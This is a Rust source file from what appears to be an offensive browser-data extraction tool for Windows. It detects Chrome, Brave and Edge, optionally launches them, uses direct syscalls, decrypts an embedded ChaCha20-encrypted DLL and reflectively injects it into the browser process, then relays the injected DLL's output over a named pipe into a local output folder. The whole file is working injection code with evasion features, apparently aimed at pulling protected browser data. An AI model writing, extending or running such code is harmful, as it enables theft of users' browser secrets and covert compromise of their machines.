use crate::modules::browser::chromium::communication::pipe;
use crate::modules::browser::chromium::injection::{process, rdi};
use crate::modules::browser::chromium::system::syscalls;
use crate::utils;
use anyhow::{Result, anyhow};
use std::path::PathBuf;
use std::sync::Arc;

pub struct Config {
    pub verbose: bool,
    pub auto_start_browser: bool,
    pub output_dir: Option<PathBuf>,
}

pub async fn run_on_all_browsers(config: Config) -> Result<()> {
    // Initialize syscalls
    if !syscalls::initialize(config.verbose) {
        return Err(anyhow!("Failed to initialize syscalls"));
    }

    // Detect all available browsers
    let available_browsers = detect_available_browsers()?;

    if available_browsers.is_empty() {
        return Err(anyhow!("No supported browsers found on this system"));
    }

    let total_browsers = available_browsers.len();
    let config = Arc::new(config);

    // Create concurrent tasks for each browser
    let mut tasks = Vec::new();

    for browser_config in available_browsers {
        let config_clone = Arc::clone(&config);
        let browser_name = browser_config.display_name.clone();

        let task = tokio::spawn(async move {
            match process_single_browser(&browser_config, &config_clone).await {
                Ok(()) => Ok(()),
                Err(e) => {
                    println!("[-] {} processing failed: {}", browser_name, e);
                    println!("[#] Error details for {}: {}", browser_name, e);
                    Err(e)
                }
            }
        });

        tasks.push(task);
    }

    let results = futures::future::join_all(tasks).await;

    let mut success_count = 0;
    for result in results {
        match result {
            Ok(Ok(())) => {
                success_count += 1;
            }
            Ok(Err(_)) => {}
            Err(_e) => {}
        }
    }

    println!(
        "[*] Processing complete: {}/{} browsers successful",
        success_count, total_browsers
    );

    if success_count == 0 {
        return Err(anyhow!("Failed to process any browsers"));
    }

    Ok(())
}

fn detect_available_browsers() -> Result<Vec<BrowserConfig>> {
    let mut browsers = Vec::new();

    // Check Chrome
    if let Ok(chrome_path) = utils::get_chrome_executable_path() {
        browsers.push(BrowserConfig {
            display_name: "Google Chrome".to_string(),
            process_name: "chrome.exe".to_string(),
            executable_path: chrome_path,
            browser_type: "chrome".to_string(),
        });
    }

    // Check Brave
    if let Ok(brave_path) = utils::get_brave_executable_path() {
        browsers.push(BrowserConfig {
            display_name: "Brave Browser".to_string(),
            process_name: "brave.exe".to_string(),
            executable_path: brave_path,
            browser_type: "brave".to_string(),
        });
    }

    // Check Edge
    if let Ok(edge_path) = utils::get_edge_executable_path() {
        browsers.push(BrowserConfig {
            display_name: "Microsoft Edge".to_string(),
            process_name: "msedge.exe".to_string(),
            executable_path: edge_path,
            browser_type: "edge".to_string(),
        });
    }

    Ok(browsers)
}

async fn process_single_browser(browser_config: &BrowserConfig, config: &Config) -> Result<()> {
    // Find or start browser process
    let process_id = if let Some(pid) = process::find_by_name(&browser_config.process_name)? {
        pid
    } else if config.auto_start_browser {
        process::start_browser(&browser_config.executable_path)?
    } else {
        return Err(anyhow!(
            "No running {} process found. Use --auto-start to launch automatically.",
            browser_config.display_name
        ));
    };

    // Rest of the injection logic remains the same but with async delays
    let process_handle = process::open_handle(process_id)?;
    process::check_architecture_match(process_handle)?;

    let mut pipe_comm =
        pipe::PipeCommunicator::new_with_prefix(&format!("abe_{}", browser_config.browser_type));
    pipe_comm.create()?;

    let pipe_name = pipe_comm.get_name();

    let pipe_name_wide: Vec<u16> = pipe_name.encode_utf16().chain(Some(0)).collect();
    let dll_buffer = load_and_decrypt_payload()?;

    let injection_result = rdi::inject(
        process_handle,
        &dll_buffer,
        pipe_name_wide.as_ptr() as *const std::ffi::c_void,
    )?;

    if injection_result {
        std::thread::sleep(std::time::Duration::from_millis(5000));

        // Connection retry loop with async delays
        let mut connection_attempts = 0;
        const MAX_CONNECTION_ATTEMPTS: u32 = 3;

        loop {
            connection_attempts += 1;

            match pipe_comm.wait_for_connection() {
                Ok(()) => {
                    println!(
                        "[+] {} DLL connected to named pipe",
                        browser_config.display_name
                    );
                    break;
                }
                Err(e) => {
                    if connection_attempts >= MAX_CONNECTION_ATTEMPTS {
                        return Err(anyhow!(
                            "Failed to establish pipe connection with {} after {} attempts: {}",
                            browser_config.display_name,
                            MAX_CONNECTION_ATTEMPTS,
                            e
                        ));
                    }

                    println!(
                        "[#] {} connection attempt {} failed: {}. Waiting before retry...",
                        browser_config.display_name, connection_attempts, e
                    );
                    std::thread::sleep(std::time::Duration::from_millis(5000));
                }
            }
        }

        // Send configuration and handle communication
        let verbose_msg = if config.verbose {
            "VERBOSE_TRUE"
        } else {
            "VERBOSE_FALSE"
        };
        pipe_comm.send_message(verbose_msg)?;

        let output_path = config
            .output_dir
            .clone()
            .unwrap_or_else(|| std::env::current_dir().unwrap());

        // Ensure output directory exists before proceeding
        std::fs::create_dir_all(&output_path)?;

        pipe_comm.send_message(&output_path.to_string_lossy())?;

        pipe_comm.relay_messages_until_complete(Some(output_path))?;
    } else {
        return Err(anyhow!(
            "Reflective DLL injection into {} failed",
            browser_config.display_name
        ));
    }

    Ok(())
}

struct BrowserConfig {
    display_name: String,
    process_name: String,
    executable_path: PathBuf,
    browser_type: String,
}

fn load_and_decrypt_payload() -> Result<Vec<u8>> {
    // Load encrypted DLL from embedded resources
    let encrypted_data = utils::get_embedded_resource("PAYLOAD_DLL", "RCDATA")?;

    // Decrypt using ChaCha20
    let mut dll_buffer = encrypted_data.to_vec();
    crate::modules::browser::chromium::crypto::crypto::chacha20_decrypt(&mut dll_buffer)?;

    Ok(dll_buffer)
}
